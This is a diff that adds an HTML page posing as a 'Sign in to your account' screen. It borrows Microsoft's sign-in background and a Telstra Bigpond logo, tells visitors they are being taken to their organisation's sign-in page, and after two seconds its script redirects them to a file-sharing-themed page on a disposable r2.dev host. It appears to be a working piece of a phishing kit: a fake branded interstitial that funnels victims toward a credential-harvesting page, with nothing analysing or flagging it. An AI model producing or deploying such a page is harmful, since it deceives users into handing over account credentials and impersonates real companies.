@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+<title>Sign in to your account</title>
+<link href="local_resources/img/042bf57ed0bc4308506dd581619e4468.ico" rel="icon" type="image/png"/> <!-- Replace with your favicon URL -->
+<style>
+    body {
+      font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI", "Gadugi", "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", "Tunga", "Lao UI", "Raavi", "Iskoola Pota", "Latha", "Leelawadee", "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic", "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti", "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+      margin: 0;
+    }
+    .outer-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      position: relative;
+      overflow: hidden; /* Hide overflow */
+      background-image: url('https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg'); /* Replace with your image URL */
+      background-size: cover; /* Ensures the image covers the entire container */
+      background-position: center; /* Centers the background image */
+      background-repeat: no-repeat; /* Prevents the image from repeating */
+    }
+    .container {
+      background-color: white;
+      text-align: left;
+      padding: 40px;
+      border-radius: 0;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      position: relative;
+      width: 333px; /* Fixed width for the container */
+      height: 23vh;
+    }
+    img {
+      max-width: 27%;
+      margin-bottom: 20px; /* Adjust margin between image and text */
+      animation: scaleEffect 10s ease-in-out infinite;
+    }
+    p {
+      font-size: 24px;
+      font-weight: bold;
+      margin: 0 0 20px; /* Adjust margins */
+      color: black;
+    }
+    
+    .dot-line {
+      width: 50%;
+      margin-bottom: 100px; /* Increase space between dots and text */
+    }
+    .dot-line::before {
+      content: '...'; /* Add more dots for the line effect */
+      animation: moveDot 10s linear infinite; /* Change the duration of the dot animation */
+      color:  #0072c6; /* Change the color of the dots */
+      font-weight: bold; /* Make the dots bold */
+      opacity: 0.2; /* Initial opacity */
+      position: absolute;
+      left: 0; /* Start position */
+      font-size: 24px; /* Adjust the dot size */
+    }
+    .bottom-text {
+      position: absolute;
+      bottom: 5px;
+      right: 5px;
+      font-size: 12px;
+      text-align: right;
+      color: black;
+      padding: 0 20px;
+      box-sizing: border-box;
+    }
+
+    /* Keyframes */
+    @keyframes scaleEffect {
+      0% {
+        transform: scale(1);
+      }
+      70% {
+        transform: scale(1);
+      }
+      100% {
+        transform: scale(1);
+      }
+    }
+
+    @keyframes moveDot {
+      0% {
+        left: 0;
+      }
+      50% {
+        left: 50%;
+      }
+      100% {
+        left: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+<div class="outer-container">
+<div class="container">
+<img alt="Telstra Bigpond" src="local_resources/img/92e163c48662f6a3dcede48c344d3ec9.png"/>
+<p id="redirect-text">Taking you to your organisation's sign-in page</p>
+<div class="dot-line">
+<div class="dot"></div>
+<div class="dot"></div>
+<div class="dot"></div>
+<div class="dot"></div>
+<div class="dot"></div>
+<div class="dot"></div>
+</div>
+</div>
+<div class="bottom-text">
+<a href="index.html#" style="color: black;">Terms of use</a> | <a href="index.html#" style="color: black;">Privacy &amp; cookies</a> <a href="index.html#" style="color: black;">...</a>
+</div>
+</div>
+<script type="text/javascript">
+    window.onload = function() {
+      function Redirect(url) {
+        document.querySelector('img').style.animationPlayState = 'running';
+        setTimeout(() => {
+          window.location.href = url;
+        }, 2000);
+      }
+      var urlParams = new URLSearchParams(window.location.href);
+      var e = window.location.href;
+      Redirect("https://pub-72513497ae6c4cfaadef64ad7b4ce725.r2.dev/secureencrypt-fileattached.html");
+    }
+  </script>
+</body>
+</html>
